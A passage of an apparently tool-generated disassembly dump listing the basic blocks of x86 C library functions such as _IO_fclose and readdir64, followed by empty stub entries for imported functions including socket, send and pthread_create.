0xb123b7e:	mov	eax, dword ptr [esp + 0x18]
0xb123b82:	test	eax, eax
0xb123b84:	je	0xb123b98
None
|
|
|
v
0xb123b98:	xor	edx, edx
0xb123b9a:	jmp	0xb123b88
None
|
|
|
v
0xb123b46:	add	ebx, 0x874ba
0xb123b4c:	sub	esp, 0x28
0xb123b4f:	mov	edx, dword ptr [esp + 0x30]
0xb123b53:	mov	ecx, dword ptr [esp + 0x34]
0xb123b57:	mov	dword ptr [esp + 0x10], edx
0xb123b5b:	mov	eax, dword ptr [ebx + 0x35e4]
0xb123b61:	mov	dword ptr [esp + 0x14], ecx
0xb123b65:	test	eax, eax
0xb123b67:	jne	0xb123b9c
None
|
|
|
v
0xb123b40:	push	ebx
0xb123b41:	call	0xb1267db
None
|
|
|
v
0xb123b8f:	add	esp, 0x28
0xb123b92:	mov	eax, edx
0xb123b94:	pop	ebx
0xb123b95:	ret	
None
|
|
|
v
0xb123b78:	xor	edx, edx
0xb123b7a:	test	eax, eax
0xb123b7c:	jne	0xb123b8f
None
|
|
|
v
0xb123b86:	mov	edx, dword ptr [eax]
0xb123b88:	mov	eax, dword ptr [esp + 0x1c]
0xb123b8c:	add	edx, dword ptr [eax + 4]
0xb123b8f:	add	esp, 0x28
0xb123b92:	mov	eax, edx
0xb123b94:	pop	ebx
0xb123b95:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__libc_dlclose
TOTAL BLOCKS :5
0xb123bb0:	push	ebx
0xb123bb1:	call	0xb1267db
None
|
|
|
v
0xb123be2:	add	esp, 0x18
0xb123be5:	pop	ebx
0xb123be6:	ret	
None
|
|
|
v
0xb123bcd:	add	esp, 0x18
0xb123bd0:	lea	eax, dword ptr [ebx - 0x875d0]
0xb123bd6:	pop	ebx
0xb123bd7:	jmp	0xb123a60
None
|
|
|
v
0xb123bb6:	add	ebx, 0x8744a
0xb123bbc:	sub	esp, 0x18
0xb123bbf:	mov	edx, dword ptr [esp + 0x20]
0xb123bc3:	mov	eax, dword ptr [ebx + 0x35e4]
0xb123bc9:	test	eax, eax
0xb123bcb:	jne	0xb123bdc
None
|
|
|
v
0xb123bdc:	mov	dword ptr [esp], edx
0xb123bdf:	call	dword ptr [eax + 8]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b1267db
TOTAL BLOCKS :1
0xb1267db:	mov	ebx, dword ptr [esp]
0xb1267de:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b1267df
TOTAL BLOCKS :1
0xb1267df:	mov	ecx, dword ptr [esp]
0xb1267e2:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_fclose
TOTAL BLOCKS :35
0xb126c78:	mov	ecx, dword ptr [esi]
0xb126c7a:	mov	edi, eax
0xb126c7c:	and	ch, 0x80
0xb126c7f:	jne	0xb126c11
None
|
|
|
v
0xb126c22:	mov	eax, dword ptr [esi + 0x24]
0xb126c25:	test	eax, eax
0xb126c27:	je	0xb126c31
None
|
|
|
v
0xb126b90:	push	ebp
0xb126b91:	push	edi
0xb126b92:	push	esi
0xb126b93:	push	ebx
0xb126b94:	sub	esp, 0x1c
0xb126b97:	mov	esi, dword ptr [esp + 0x30]
0xb126b9b:	call	0xb1267db
None
|
|
|
v
0xb126c8a:	mov	dword ptr [edx + 8], 0
0xb126c91:	cmp	dword ptr gs:[0xc], 0
0xb126c99:	je	0xb126c9c
None
|
|
|
v
0xb126bf9:	add	dword ptr [edi + 4], 1
0xb126bfd:	mov	ecx, edx
0xb126bff:	mov	edi, edx
0xb126c01:	shl	edi, 0x1a
0xb126c04:	sar	edi, 0x1f
0xb126c07:	and	dh, 0x20
0xb126c0a:	jne	0xb126c70
None
|
|
|
v
0xb126c0c:	and	ch, 0x80
0xb126c0f:	je	0xb126c81
None
|
|
|
v
0xb126ca8:	mov	dword ptr [esp], esi
0xb126cab:	call	0xb0701b0
None
|
|
|
v
0xb126c3b:	cmp	esi, dword ptr [ebx + 0xd80]
0xb126c41:	je	0xb126c61
None
|
|
|
v
0xb126cc0:	mov	dword ptr [esp], esi
0xb126cc3:	call	0xb0634f0
None
|
|
|
v
0xb126bb0:	mov	edx, dword ptr [esi]
0xb126bb2:	test	dh, 0x20
0xb126bb5:	mov	ecx, edx
0xb126bb7:	jne	0xb126ca8
None
|
|
|
v
0xb126be4:	lock cmpxchg	dword ptr [edi], ecx
0xb126be8:	jne	0xb126d09
None
|
|
|
v
0xb126bd5:	mov	ecx, 1
0xb126bda:	cmp	dword ptr gs:[0xc], 0
0xb126be2:	je	0xb126be5
None
|
|
|
v
0xb126cb0:	mov	edx, dword ptr [esi]
0xb126cb2:	mov	ecx, edx
0xb126cb4:	jmp	0xb126bbd
None
|
|
|
v
0xb126bbd:	mov	eax, edx
0xb126bbf:	and	eax, 0x8000
0xb126bc4:	jne	0xb126bff
None
|
|
|
v
0xb126c29:	mov	dword ptr [esp], esi
0xb126c2c:	call	0xb070880
None
|
|
|
v
0xb126c43:	cmp	esi, dword ptr [ebx + 0xd7c]
0xb126c49:	je	0xb126c61
None
|
|
|
v
0xb126d1c:	jmp	0xb126ca1
None
|
|
|
v
0xb126ba0:	add	ebx, 0x84460
0xb126ba6:	cmp	byte ptr [esi + 0x46], 0
0xb126baa:	je	0xb126cc0
None
|
|
|
v
0xb126cc8:	add	esp, 0x1c
0xb126ccb:	pop	ebx
0xb126ccc:	pop	esi
0xb126ccd:	pop	edi
0xb126cce:	pop	ebp
0xb126ccf:	ret	
None
|
|
|
v
0xb126d09:	lea	ecx, dword ptr [edi]
0xb126d0b:	call	0xb0f9430
None
|
|
|
v
0xb126c70:	mov	dword ptr [esp], esi
0xb126c73:	call	0xb1283d0
None
|
|
|
v
0xb126ca1:	jmp	0xb126c11
None
|
|
|
v
0xb126c61:	add	esp, 0x1c
0xb126c64:	pop	ebx
0xb126c65:	pop	esi
0xb126c66:	pop	edi
0xb126c67:	pop	ebp
0xb126c68:	ret	
None
|
|
|
v
0xb126c9b:	lock sub	dword ptr [edx], 1
None
|
|
|
v
0xb126c81:	mov	edx, dword ptr [esi + 0x48]
0xb126c84:	sub	dword ptr [edx + 4], 1
0xb126c88:	jne	0xb126c11
None
|
|
|
v
0xb126d10:	jmp	0xb126bee
None
|
|
|
v
0xb126bee:	mov	eax, dword ptr [esi + 0x48]
0xb126bf1:	mov	edi, dword ptr [esi + 0x48]
0xb126bf4:	mov	edx, dword ptr [esi]
0xb126bf6:	mov	dword ptr [eax + 8], ebp
0xb126bf9:	add	dword ptr [edi + 4], 1
0xb126bfd:	mov	ecx, edx
0xb126bff:	mov	edi, edx
0xb126c01:	shl	edi, 0x1a
0xb126c04:	sar	edi, 0x1f
0xb126c07:	and	dh, 0x20
0xb126c0a:	jne	0xb126c70
None
|
|
|
v
0xb126c31:	cmp	esi, dword ptr [ebx + 0xd84]
0xb126c37:	mov	eax, edi
0xb126c39:	je	0xb126c61
None
|
|
|
v
0xb126c5d:	mov	eax, dword ptr [esp + 0xc]
0xb126c61:	add	esp, 0x1c
0xb126c64:	pop	ebx
0xb126c65:	pop	esi
0xb126c66:	pop	edi
0xb126c67:	pop	ebp
0xb126c68:	ret	
None
|
|
|
v
0xb126bff:	mov	edi, edx
0xb126c01:	shl	edi, 0x1a
0xb126c04:	sar	edi, 0x1f
0xb126c07:	and	dh, 0x20
0xb126c0a:	jne	0xb126c70
None
|
|
|
v
0xb126c9f:	jne	0xb126d15
None
|
|
|
v
0xb126c4b:	mov	dword ptr [esi], 0
0xb126c51:	mov	dword ptr [esp], esi
0xb126c54:	mov	dword ptr [esp + 0xc], edi
0xb126c58:	call	0xb017470
None
|
|
|
v
0xb126d15:	lea	eax, dword ptr [edx]
0xb126d17:	call	0xb0f9460
None
|
|
|
v
0xb126bc6:	mov	edi, dword ptr [esi + 0x48]
0xb126bc9:	mov	ebp, dword ptr gs:[8]
0xb126bd0:	cmp	ebp, dword ptr [edi + 8]
0xb126bd3:	je	0xb126bf9
None
|
|
|
v
0xb126c11:	mov	eax, dword ptr [esi + 0x4c]
0xb126c14:	mov	dword ptr [esp + 4], 0
0xb126c1c:	mov	dword ptr [esp], esi
0xb126c1f:	call	dword ptr [eax + 8]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b1278f0
TOTAL BLOCKS :15
0xb127998:	sub	eax, 1
0xb12799b:	mov	dword ptr [esp + 8], edi
0xb12799f:	mov	dword ptr [esp + 4], ebp
0xb1279a3:	mov	dword ptr [esp], eax
0xb1279a6:	call	0xb071310
None
|
|
|
v
0xb127904:	mov	dword ptr [eax + 0x40], 0xffffffff
0xb12790b:	mov	eax, dword ptr [esi + 0x4c]
0xb12790e:	mov	edx, dword ptr [esp + 0x20]
0xb127912:	mov	dword ptr [esp + 4], ebp
0xb127916:	mov	dword ptr [esp], esi
0xb127919:	mov	dword ptr [esp + 8], edx
0xb12791d:	call	dword ptr [eax + 0x3c]
None
|
|
|
v
0xb12792b:	test	edi, edi
0xb12792d:	jne	0xb127998
None
|
|
|
v
0xb127985:	mov	dword ptr [esi + 0x40], eax
0xb127988:	jmp	0xb12790b
None
|
|
|
v
0xb1279ab:	add	eax, 1
0xb1279ae:	mov	word ptr [esi + 0x44], ax
0xb1279b2:	jmp	0xb12792f
None
|
|
|
v
0xb127962:	mov	ecx, dword ptr [esi + 0x4c]
0xb127965:	sub	edx, eax
0xb127967:	mov	dword ptr [esp + 4], edx
0xb12796b:	sar	edx, 0x1f
0xb12796e:	mov	dword ptr [esp + 0xc], 1
0xb127976:	mov	dword ptr [esp + 8], edx
0xb12797a:	mov	dword ptr [esp], esi
0xb12797d:	call	dword ptr [ecx + 0x40]
None
|
|
|
v
0xb127920:	mov	edi, eax
0xb127922:	movzx	eax, word ptr [esi + 0x44]
0xb127926:	test	ax, ax
0xb127929:	je	0xb12792f
None
|
|
|
v
0xb127980:	cmp	eax, 0xff
0xb127983:	je	0xb12794c
None
|
|
|
v
0xb127949:	mov	dword ptr [esi + 0x18], edx
0xb12794c:	add	esp, 0x10
0xb12794f:	mov	eax, edi
0xb127951:	pop	esi
0xb127952:	pop	edi
0xb127953:	pop	ebp
0xb127954:	ret	
None
|
|
|
v
0xb1278f0:	push	ebp
0xb1278f1:	mov	ebp, edx
0xb1278f3:	push	edi
0xb1278f4:	push	esi
0xb1278f5:	mov	esi, eax
0xb1278f7:	sub	esp, 0x10
0xb1278fa:	mov	edi, dword ptr [eax]
0xb1278fc:	and	edi, 0x1000
0xb127902:	je	0xb127958
None
|
|
|
v
0xb12790b:	mov	eax, dword ptr [esi + 0x4c]
0xb12790e:	mov	edx, dword ptr [esp + 0x20]
0xb127912:	mov	dword ptr [esp + 4], ebp
0xb127916:	mov	dword ptr [esp], esi
0xb127919:	mov	dword ptr [esp + 8], edx
0xb12791d:	call	dword ptr [eax + 0x3c]
None
|
|
|
v
0xb127990:	mov	edx, dword ptr [esi + 0x20]
0xb127993:	jmp	0xb127949
None
|
|
|
v
0xb12794c:	add	esp, 0x10
0xb12794f:	mov	eax, edi
0xb127951:	pop	esi
0xb127952:	pop	edi
0xb127953:	pop	ebp
0xb127954:	ret	
None
|
|
|
v
0xb127958:	mov	eax, dword ptr [eax + 8]
0xb12795b:	mov	edx, dword ptr [esi + 0x10]
0xb12795e:	cmp	eax, edx
0xb127960:	je	0xb12790b
None
|
|
|
v
0xb12792f:	mov	edx, dword ptr [esi + 0x1c]
0xb127932:	test	dword ptr [esi], 0x202
0xb127938:	mov	dword ptr [esi + 0xc], edx
0xb12793b:	mov	dword ptr [esi + 4], edx
0xb12793e:	mov	dword ptr [esi + 8], edx
0xb127941:	mov	dword ptr [esi + 0x14], edx
0xb127944:	mov	dword ptr [esi + 0x10], edx
0xb127947:	je	0xb127990
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_do_write
TOTAL BLOCKS :4
0xb1283a0:	push	esi
0xb1283a1:	xor	eax, eax
0xb1283a3:	sub	esp, 0x18
0xb1283a6:	mov	esi, dword ptr [esp + 0x28]
0xb1283aa:	test	esi, esi
0xb1283ac:	je	0xb1283c8
None
|
|
|
v
0xb1283be:	cmp	esi, eax
0xb1283c0:	setne	al
0xb1283c3:	movzx	eax, al
0xb1283c6:	neg	eax
0xb1283c8:	add	esp, 0x18
0xb1283cb:	pop	esi
0xb1283cc:	ret	
None
|
|
|
v
0xb1283c8:	add	esp, 0x18
0xb1283cb:	pop	esi
0xb1283cc:	ret	
None
|
|
|
v
0xb1283ae:	mov	edx, dword ptr [esp + 0x24]
0xb1283b2:	mov	eax, dword ptr [esp + 0x20]
0xb1283b6:	mov	dword ptr [esp], esi
0xb1283b9:	call	0xb1278f0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_file_close_it
TOTAL BLOCKS :13
0xb12846c:	mov	eax, edi
0xb12846e:	mov	dword ptr [esi], 0xfbad240c
0xb128474:	mov	dword ptr [esi + 0x38], 0xffffffff
0xb12847b:	mov	dword ptr [esi + 0x40], 0xffffffff
0xb128482:	add	esp, 0x1c
0xb128485:	pop	ebx
0xb128486:	pop	esi
0xb128487:	pop	edi
0xb128488:	pop	ebp
0xb128489:	ret	
None
|
|
|
v
0xb1283d0:	push	ebp
0xb1283d1:	push	edi
0xb1283d2:	push	esi
0xb1283d3:	push	ebx
0xb1283d4:	sub	esp, 0x1c
0xb1283d7:	mov	esi, dword ptr [esp + 0x30]
0xb1283db:	call	0xb1267db
None
|
|
|
v
0xb12841a:	mov	dword ptr [esp + 0xc], 0
0xb128422:	mov	dword ptr [esp + 8], 0
0xb12842a:	mov	dword ptr [esp + 4], 0
0xb128432:	mov	dword ptr [esp], esi
0xb128435:	call	0xb070bd0
None
|
|
|
v
0xb12840a:	mov	dword ptr [esp], esi
0xb12840d:	mov	edi, eax
0xb12840f:	call	0xb071ab0
None
|
|
|
v
0xb128490:	mov	eax, dword ptr [esi + 0x4c]
0xb128493:	mov	dword ptr [esp], esi
0xb128496:	call	dword ptr [eax + 0x44]
None
|
|
|
v
0xb1283f2:	mov	eax, dword ptr [esi + 0x10]
0xb1283f5:	mov	edx, dword ptr [esi + 0x14]
0xb1283f8:	mov	dword ptr [esp], esi
0xb1283fb:	mov	dword ptr [esp + 4], eax
0xb1283ff:	sub	edx, eax
0xb128401:	mov	dword ptr [esp + 8], edx
0xb128405:	call	0xb1283a0
None
|
|
|
v
0xb1284bb:	mov	dword ptr [esi + 0xc], 0
0xb1284c2:	mov	dword ptr [esi + 4], 0
0xb1284c9:	mov	dword ptr [esi + 8], 0
0xb1284d0:	mov	dword ptr [esi + 0x14], 0
0xb1284d7:	mov	dword ptr [esi + 0x10], 0
0xb1284de:	mov	dword ptr [esi + 0x18], 0
0xb1284e5:	mov	dword ptr [esp], esi
0xb1284e8:	call	0xb0701b0
None
|
|
|
v
0xb1284ed:	test	ebp, ebp
0xb1284ef:	mov	eax, ebp
0xb1284f1:	mov	dword ptr [esi], 0xfbad240c
0xb1284f7:	cmove	eax, edi
0xb1284fa:	mov	dword ptr [esi + 0x38], 0xffffffff
0xb128501:	mov	dword ptr [esi + 0x40], 0xffffffff
0xb128508:	add	esp, 0x1c
0xb12850b:	pop	ebx
0xb12850c:	pop	esi
0xb12850d:	pop	edi
0xb12850e:	pop	ebp
0xb12850f:	ret	
None
|
|
|
v
0xb1283e0:	add	ebx, 0x82c20
0xb1283e6:	mov	eax, dword ptr [esi + 0x38]
0xb1283e9:	cmp	eax, 0xff
0xb1283ec:	je	0xb128482
None
|
|
|
v
0xb128414:	test	byte ptr [esi + 0x3c], 0x20
0xb128418:	je	0xb128490
None
|
|
|
v
0xb128482:	add	esp, 0x1c
0xb128485:	pop	ebx
0xb128486:	pop	esi
0xb128487:	pop	edi
0xb128488:	pop	ebp
0xb128489:	ret	
None
|
|
|
v
0xb128499:	mov	dword ptr [esp], esi
0xb12849c:	mov	dword ptr [esp + 0xc], 0
0xb1284a4:	mov	dword ptr [esp + 8], 0
0xb1284ac:	mov	dword ptr [esp + 4], 0
0xb1284b4:	mov	ebp, eax
0xb1284b6:	call	0xb070bd0
None
|
|
|
v
0xb12843a:	mov	dword ptr [esi + 0xc], 0
0xb128441:	mov	dword ptr [esi + 4], 0
0xb128448:	mov	dword ptr [esi + 8], 0
0xb12844f:	mov	dword ptr [esi + 0x14], 0
0xb128456:	mov	dword ptr [esi + 0x10], 0
0xb12845d:	mov	dword ptr [esi + 0x18], 0
0xb128464:	mov	dword ptr [esp], esi
0xb128467:	call	0xb0701b0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:readdir64
TOTAL BLOCKS :22
0xb1287cc:	lock cmpxchg	dword ptr [esi + 4], ecx
0xb1287d1:	jne	0xb12885c
None
|
|
|
v
0xb128871:	jmp	0xb128841
None
|
|
|
v
0xb12883a:	lock sub	dword ptr [esi + 4], 1
None
|
|
|
v
0xb128790:	push	ebp
0xb128791:	mov	ebp, dword ptr gs:[0]
0xb128798:	mov	ecx, 1
0xb12879d:	push	edi
0xb12879e:	push	esi
0xb12879f:	push	ebx
0xb1287a0:	call	0xb1267db
None
|
|
|
v
0xb12883f:	jne	0xb128869
None
|
|
|
v
0xb128864:	jmp	0xb1287d7
None
|
|
|
v
0xb12881a:	mov	eax, dword ptr [ebx - 0xdc]
0xb128820:	xor	edx, edx
0xb128822:	mov	edi, dword ptr [esp + 0xc]
0xb128826:	mov	dword ptr [ebp + eax], edi
0xb12882a:	lea	esi, dword ptr [esi]
0xb128830:	cmp	dword ptr gs:[0xc], 0
0xb128838:	je	0xb12883b
None
|
|
|
v
0xb1287a5:	add	ebx, 0x8285b
0xb1287ab:	sub	esp, 0x1c
0xb1287ae:	mov	esi, dword ptr [esp + 0x30]
0xb1287b2:	mov	eax, dword ptr [ebx - 0xdc]
0xb1287b8:	mov	eax, dword ptr [ebp + eax]
0xb1287bc:	mov	dword ptr [esp + 0xc], eax
0xb1287c0:	xor	eax, eax
0xb1287c2:	cmp	dword ptr gs:[0xc], 0
0xb1287ca:	je	0xb1287cd
None
|
|
|
v
0xb128830:	cmp	dword ptr gs:[0xc], 0
0xb128838:	je	0xb12883b
None
|
|
|
v
0xb1287d7:	mov	eax, dword ptr [esi + 0x10]
0xb1287da:	lea	edi, dword ptr [esi + 0x1c]
0xb1287dd:	jmp	0xb1287f9
None
|
|
|
v
0xb12885c:	lea	ecx, dword ptr [esi + 4]
0xb12885f:	call	0xb0f9430
None
|
|
|
v
0xb128818:	jne	0xb12884b
None
|
|
|
v
0xb1287e4:	movzx	ecx, word ptr [edx + 0xc]
0xb1287e8:	add	eax, ecx
0xb1287ea:	mov	ecx, dword ptr [edx + 4]
0xb1287ed:	mov	dword ptr [esi + 0x10], eax
0xb1287f0:	mov	dword ptr [esi + 0x14], ecx
0xb1287f3:	mov	ecx, dword ptr [edx]
0xb1287f5:	test	ecx, ecx
0xb1287f7:	jne	0xb128830
None
|
|
|
v
0xb128858:	xor	edx, edx
0xb12885a:	jmp	0xb128830
None
|
|
|
v
0xb1287fe:	mov	ecx, dword ptr [esi + 8]
0xb128801:	mov	edx, edi
0xb128803:	mov	eax, dword ptr [esi]
0xb128805:	call	0xb0b1870
None
|
|
|
v
0xb12880a:	cmp	eax, 0
0xb12880d:	jle	0xb128818
None
|
|
|
v
0xb1287f9:	cmp	dword ptr [esi + 0xc], eax
0xb1287fc:	ja	0xb1287e0
None
|
|
|
v
0xb128869:	lea	eax, dword ptr [esi + 4]
0xb12886c:	call	0xb0f9460
None
|
|
|
v
0xb1287e0:	lea	edx, dword ptr [esi + eax + 0x1c]
0xb1287e4:	movzx	ecx, word ptr [edx + 0xc]
0xb1287e8:	add	eax, ecx
0xb1287ea:	mov	ecx, dword ptr [edx + 4]
0xb1287ed:	mov	dword ptr [esi + 0x10], eax
0xb1287f0:	mov	dword ptr [esi + 0x14], ecx
0xb1287f3:	mov	ecx, dword ptr [edx]
0xb1287f5:	test	ecx, ecx
0xb1287f7:	jne	0xb128830
None
|
|
|
v
0xb12880f:	mov	dword ptr [esi + 0xc], eax
0xb128812:	mov	edx, edi
0xb128814:	xor	eax, eax
0xb128816:	jmp	0xb1287e4
None
|
|
|
v
0xb128841:	add	esp, 0x1c
0xb128844:	mov	eax, edx
0xb128846:	pop	ebx
0xb128847:	pop	esi
0xb128848:	pop	edi
0xb128849:	pop	ebp
0xb12884a:	ret	
None
|
|
|
v
0xb12884b:	mov	eax, dword ptr [ebx - 0xdc]
0xb128851:	cmp	dword ptr [ebp + eax], 2
0xb128856:	je	0xb12881a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b12b390
TOTAL BLOCKS :8
0xb12b3d4:	nop	
0xb12b3d6:	nop	
0xb12b3d8:	nop	
0xb12b3da:	nop	
0xb12b3dc:	nop	
0xb12b3de:	nop	
0xb12b3e0:	push	esi
0xb12b3e1:	push	ebx
0xb12b3e2:	sub	esp, 0x24
0xb12b3e5:	mov	eax, dword ptr [esp + 0x4c]
0xb12b3e9:	call	0xb1267db
None
|
|
|
v
0xb12b398:	add	ebx, 0x7fc68
0xb12b39e:	sub	esp, 8
0xb12b3a1:	mov	eax, dword ptr [ebx + 0x38d8]
0xb12b3a7:	test	eax, eax
0xb12b3a9:	jne	0xb12b3c0
None
|
|
|
v
0xb12b3c0:	mov	edx, dword ptr [ebx + 0x38c4]
0xb12b3c6:	mov	eax, ecx
0xb12b3c8:	ror	edx, 9
0xb12b3cb:	xor	edx, dword ptr gs:[0x18]
0xb12b3d2:	call	edx
None
|
|
|
v
0xb12b390:	push	ebx
0xb12b391:	mov	ecx, eax
0xb12b393:	call	0xb1267db
None
|
|
|
v
0xb12b434:	test	eax, eax
0xb12b436:	setne	dl
0xb12b439:	test	esi, esi
0xb12b43b:	sete	al
0xb12b43e:	add	esp, 0x24
0xb12b441:	or	eax, edx
0xb12b443:	movzx	eax, al
0xb12b446:	neg	eax
0xb12b448:	pop	ebx
0xb12b449:	pop	esi
0xb12b44a:	ret	
None
|
|
|
v
0xb12b3be:	xchg	ebx, edx
0xb12b3c0:	mov	edx, dword ptr [ebx + 0x38c4]
0xb12b3c6:	mov	eax, ecx
0xb12b3c8:	ror	edx, 9
0xb12b3cb:	xor	edx, dword ptr gs:[0x18]
0xb12b3d2:	call	edx
None
|
|
|
v
0xb12b3ee:	add	ebx, 0x7fc12
0xb12b3f4:	mov	esi, dword ptr [esp + 0x48]
0xb12b3f8:	mov	dword ptr [esp + 0x1c], eax
0xb12b3fc:	mov	eax, dword ptr [esp + 0x44]
0xb12b400:	mov	dword ptr [esp + 0x18], esi
0xb12b404:	mov	dword ptr [esp + 0x14], eax
0xb12b408:	mov	eax, dword ptr [esp + 0x40]
0xb12b40c:	mov	dword ptr [esp + 0x10], eax
0xb12b410:	mov	eax, dword ptr [esp + 0x3c]
0xb12b414:	mov	dword ptr [esp + 0xc], eax
0xb12b418:	mov	eax, dword ptr [esp + 0x38]
0xb12b41c:	mov	dword ptr [esp + 8], eax
0xb12b420:	mov	eax, dword ptr [esp + 0x34]
0xb12b424:	mov	dword ptr [esp + 4], eax
0xb12b428:	mov	eax, dword ptr [esp + 0x30]
0xb12b42c:	mov	dword ptr [esp], eax
0xb12b42f:	call	0xb0fda20
None
|
|
|
v
0xb12b3ab:	mov	edx, 9
0xb12b3b0:	xchg	ebx, edx
0xb12b3b2:	mov	eax, 0x25
0xb12b3b7:	call	dword ptr gs:[0x10]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:malloc
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sscanf
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:realloc
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fread
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fclose
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:pthread_mutex_lock
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:pthread_create
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fgets
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:usleep
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:snprintf
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fwrite
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fseek
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:send
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ftell
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:write
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:exit
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:recv
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:read
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:free
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:pthread_mutex_unlock
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:strstr
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:socket
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:close
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__errno_location
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__stack_chk_fail
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:strcmp
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:UnresolvableTarget
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:exit
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_unsupported
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_unknown
TOTAL BLOCKS :1

None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
